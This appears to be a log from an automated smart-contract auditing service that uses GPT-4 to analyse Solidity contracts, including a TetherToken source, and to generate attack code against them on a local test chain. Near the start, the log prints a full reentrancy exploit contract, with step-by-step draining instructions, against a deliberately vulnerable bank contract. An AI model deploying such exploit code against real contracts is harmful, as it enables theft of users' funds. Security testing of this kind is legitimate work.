`withdraw` function during the call and withdraw funds multiple times before the balance is updated.  \n\n- **Mechanism:**  \n  1. Attacker deposits some ETH to have a positive balance.  \n  2. Attacker calls `withdraw` to withdraw some amount.  \n  3. During the external call to `msg.sender.call{value: _amount}("")`, the attacker‚Äôs fallback or receive function triggers and calls `withdraw` again before the balance is decremented.  \n  4. This repeats, draining the contract‚Äôs ETH beyond the attacker‚Äôs balance.  \n\n- **Potential Impact:**  \n  - Complete or partial draining of the contract‚Äôs ETH balance by a malicious user.  \n  - Loss of user funds and contract insolvency.  \n\n- **Other observations:**  \n  - No access control or withdrawal limits.  \n  - No use of reentrancy guards or checks-effects-interactions pattern.  \n  - Uses Solidity 0.8.0 which has built-in overflow checks, so no arithmetic overflow issues here.  \n\n---\n\n3. **Exploitation Requirements:**\n\n- **Setup:**  \n  - Deploy a malicious contract with a fallback or receive function that calls `withdraw` again on the VulnerableBank contract.  \n  - Deposit some ETH into VulnerableBank to have a positive balance.  \n\n- **Exploit Steps:**  \n  1. Call `withdraw` from the malicious contract for a certain amount.  \n  2. When the ETH is sent back, the fallback triggers and calls `withdraw` again before the balance is updated.  \n  3. Repeat the reentrant calls recursively until the contract‚Äôs ETH balance is drained or gas runs out.  \n\n---\n\n**Summary:**  \nThe `VulnerableBank` contract is vulnerable to a classic reentrancy attack due to updating user balances **after** sending ETH via a low-level call. This allows an attacker to recursively withdraw more funds than their balance, potentially draining the contract‚Äôs ETH. The vulnerability can be fixed by updating the balance **before** the external call or by using a reentrancy guard.', 'reasoning': '**\n\n- **Contract Name:** VulnerableBank  \n- **Solidity Version:** pragma solidity ^0.8.0  \n- **Functionality:**  \n  - Users can deposit ETH via `deposit()` which increments their balance in the `balances` mapping.  \n  - Users can withdraw ETH via `withdraw(uint256 _amount)` which checks if the user has enough balance, sends ETH using a low-level call, then updates the balance after the transfer.  \n  - `getBalance()` returns the caller‚Äôs balance.  \n\n- **State Variables:**  \n  - `mapping(address => uint256) balances` tracks user deposits.  \n- **ETH Holding:** The contract holds ETH deposited by users.  \n\n---\n\n2. **', 'summary': '**\n\n- **Reentrancy Vulnerability in `withdraw` function:**  \n  The contract sends ETH to `msg.sender` via a low-level call:  \n  ```solidity\n  (bool success, ) = msg.sender.call{value: _amount}("");\n  require(success, "√âchec du transfert");\n  balances[msg.sender] -= _amount;\n  ```  \n  The balance is updated **after** the external call. This allows a malicious contract to re-enter the `withdraw` function during the call and withdraw funds multiple times before the balance is updated.  \n\n- **Mechanism:**  \n  1. Attacker deposits some ETH to have a positive balance.  \n  2. Attacker calls `withdraw` to withdraw some amount.  \n  3. During the external call to `msg.sender.call{value: _amount}("")`, the attacker‚Äôs fallback or receive function triggers and calls `withdraw` again before the balance is decremented.  \n  4. This repeats, draining the contract‚Äôs ETH beyond the attacker‚Äôs balance.  \n\n- **Potential Impact:**  \n  - Complete or partial draining of the contract‚Äôs ETH balance by a malicious user.  \n  - Loss of user funds and contract insolvency.  \n\n- **Other observations:**  \n  - No access control or withdrawal limits.  \n  - No use of reentrancy guards or checks-effects-interactions pattern.  \n  - Uses Solidity 0.8.0 which has built-in overflow checks, so no arithmetic overflow issues here.  \n\n---\n\n3. **', 'code': 'pragma solidity 0.8.0;\n\ninterface IVulnerableBank {\n    function deposit() external payable;\n    function withdraw(uint256 _amount) external;\n    function getBalance() external view returns (uint256);\n}\n\ncontract ReentrancyAttack {\n    IVulnerableBank public vulnerableBank;\n    uint256 public attackAmount;\n\n    constructor(address _vulnerableBank) {\n        vulnerableBank = IVulnerableBank(_vulnerableBank);\n    }\n\n    function attack() external payable {\n        require(msg.value > 0, "Send ETH to attack");\n        attackAmount = msg.value;\n        vulnerableBank.deposit{value: msg.value}();\n        vulnerableBank.withdraw(attackAmount);\n    }\n\n    receive() external payable {\n        uint256 bankBalance = address(vulnerableBank).balance;\n        if (bankBalance >= attackAmount) {\n            vulnerableBank.withdraw(attackAmount);\n        }\n    }\n\n    function collect() external {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}', 'code_type': 'solidity', 'duration': 17.75998616218567}
2025-07-05 13:13:40,247 - app.services.contract_service - INFO - Has exploit code: True
2025-07-05 13:13:40,248 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 13:13:40,249 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 13:13:40,250 - app.services.contract_service - INFO - Attack strategy summary: **

- **Reentrancy Vulnerability in `withdraw` function:**  
  The contract sends ETH to `msg.sender` via a low-level call:  
  ```solidity
  (bool success, ) = msg.sender.call{value: _amount}("");
  require(success, "√âchec du transfert");
  balances[msg.sender] -= _amount;
  ```  
  The balance is updated **after** the external call. This allows a malicious contract to re-enter the `withdraw` function during the call and withdraw funds multiple times before the balance is updated.  

- **Mechanism:**  
  1. Attacker deposits some ETH to have a positive balance.  
  2. Attacker calls `withdraw` to withdraw some amount.  
  3. During the external call to `msg.sender.call{value: _amount}("")`, the attacker‚Äôs fallback or receive function triggers and calls `withdraw` again before the balance is decremented.  
  4. This repeats, draining the contract‚Äôs ETH beyond the attacker‚Äôs balance.  

- **Potential Impact:**  
  - Complete or partial draining of the contract‚Äôs ETH balance by a malicious user.  
  - Loss of user funds and contract insolvency.  

- **Other observations:**  
  - No access control or withdrawal limits.  
  - No use of reentrancy guards or checks-effects-interactions pattern.  
  - Uses Solidity 0.8.0 which has built-in overflow checks, so no arithmetic overflow issues here.  

---

3. **
2025-07-05 13:13:40,251 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 13:13:40,252 - app.services.contract_service - INFO - Temporary file /tmp/tmptx41rdbi.sol removed
2025-07-05 13:13:40,300 - app.api.contract - INFO - Report saved with filename: VulnerableBank_2025-07-05_13-13, status: KO
2025-07-05 13:13:40,303 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-07-05 13:13:40,305 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:13:40,307 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:13:40,309 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:13:40,312 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:13:40,316 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:13:40] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:13:40,362 - solcx - INFO - solc 0.4.17 successfully installed at: /root/.solcx/solc-v0.4.17
2025-07-05 13:13:40,367 - solcx - INFO - Using solc version 0.4.17
2025-07-05 13:13:41,852 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:13:41,854 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:13:41,856 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:13:41,860 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:13:41,864 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:13:41] "OPTIONS /history HTTP/1.1" 200 -
2025-07-05 13:13:41,926 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:13:41,927 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:13:41,929 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:13:41,930 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:13:41,931 - werkzeug - INFO - 192.168.112.1 - - [05/Jul/2025 13:13:41] "GET /history HTTP/1.1" 200 -
2025-07-05 13:13:43,558 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:13:44,654 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-07-05 13:13:44,657 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-07-05 13:13:45,486 - app.services.contract_service - INFO - Contract Ownable deployed at 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7
2025-07-05 13:13:45,488 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-07-05 13:13:45,637 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-07-05 13:13:45,644 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-07-05 13:13:45,851 - app.services.contract_service - INFO - Contract Ownable funded
2025-07-05 13:13:46,201 - app.services.contract_service - INFO - Contract Pausable deployed at 0xe982E462b094850F12AF94d21D470e21bE9D0E9C
2025-07-05 13:13:46,202 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-07-05 13:13:46,364 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-07-05 13:13:46,366 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-07-05 13:13:46,513 - app.services.contract_service - INFO - Contract Pausable funded
2025-07-05 13:13:46,828 - app.services.contract_service - INFO - Contract SafeMath deployed at 0x59d3631c86BbE35EF041872d502F218A39FBa150
2025-07-05 13:13:46,830 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-07-05 13:13:46,857 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-07-05 13:13:46,858 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-07-05 13:13:46,991 - app.services.contract_service - INFO - Contract SafeMath funded
2025-07-05 13:13:47,613 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:13:48,312 - app.services.contract_service - INFO - Contract TetherToken deployed at 0x0290FB167208Af455bB137780163b7B7a9a10C16
2025-07-05 13:13:48,314 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-07-05 13:13:51,174 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:13:52,195 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:13:53,018 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:13:53,174 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-07-05 13:13:53,176 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-07-05 13:13:53,325 - app.services.contract_service - INFO - Contract TetherToken funded
2025-07-05 13:13:53,327 - app.services.contract_service - INFO - Building contract observation...
2025-07-05 13:13:56,273 - app.services.contract_service - INFO - Contract observation built successfully
2025-07-05 13:13:56,275 - app.services.contract_service - INFO - Generating attack strategy...
2025-07-05 13:13:56,276 - app.services.contract_service - INFO - Running Slither analysis...
2025-07-05 13:13:56,289 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 13:13:56,301 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 13:13:56,302 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 13:13:56,304 - app.modules.attack_generator - INFO - Contract name: Ownable
2025-07-05 13:13:56,305 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-05 13:13:56,306 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 13:13:56,319 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:13:56,320 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:13:56,321 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:14:19,194 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:14:19,218 - app.modules.attack_generator - INFO - Received response from OpenAI API in 22.90 seconds
2025-07-05 13:14:19,226 - app.modules.attack_generator - INFO - Contract analysis completed in 22.90 seconds
2025-07-05 13:14:19,228 - app.modules.attack_generator - INFO - Vulnerability assessment: **

- **Centralized Control / Owner Privileges:**
  - The owner has extensive control:
    - Can pau...
2025-07-05 13:14:19,230 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 13:14:19,232 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:14:19,234 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:14:19,235 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:14:22,631 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:14:22,652 - app.modules.attack_generator - INFO - Received response from OpenAI API in 3.42 seconds
2025-07-05 13:14:22,657 - app.modules.attack_generator - INFO - Attack code generation completed in 3.42 seconds
2025-07-05 13:14:22,660 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 715
2025-07-05 13:14:22,662 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 26.32 seconds
2025-07-05 13:14:22,665 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 13:14:22,677 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpfo1636da.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857894140000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return 